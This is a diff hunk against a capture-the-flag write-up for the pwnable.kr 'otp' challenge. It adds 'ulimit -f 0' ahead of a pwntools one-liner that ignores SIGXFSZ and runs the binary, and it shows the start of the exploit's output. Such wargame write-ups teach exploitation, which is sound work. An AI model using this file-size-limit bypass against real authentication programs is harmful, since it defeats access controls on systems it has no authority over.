@@ -92,6 +92,7 @@ This can be done easily in python using the [signal](https://docs.python.org/2.7
 Putting it all together we arrive at the final exploit:
 
 ```
+otp@pwnable:~$ ulimit -f 0
 otp@pwnable:~$ python -c "from pwn import *; import signal; signal.signal(signal.SIGXFSZ, signal.SIG_IGN); print process(['./otp', '0']).recvall()"
 [+] Starting local process './otp': pid 433582
 [+] Receiving all data: Done (90B)
